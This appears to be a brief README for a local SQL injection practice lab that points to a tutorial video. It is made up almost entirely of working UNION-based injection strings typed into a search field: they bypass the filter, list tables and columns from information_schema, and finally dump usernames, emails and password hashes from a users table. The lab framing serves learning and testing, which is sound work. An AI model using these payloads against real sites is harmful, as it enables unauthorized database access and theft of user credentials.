# sql-injection
#follow this video: https://www.youtube.com/watch?v=ciNHn38EyRc

configure the source file and db in your localhost to test 


#0)type the below string to get all the products

';-- --


#1)search the below text to see table list:

golf' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3 from information_schema.tables) -- -


#2)now let's see the available columns in a specific table that is listed in the upper query(in the below example i used users table)

golf' UNION (SELECT COLUMN_NAME,2,3 from information_schema.columns WHERE TABLE_NAME='users') -- -


#3) and finally let's see the username, email , paassword(HASH) from users table by searching the below query

golf' UNION (SELECT username,email,password from users) -- -
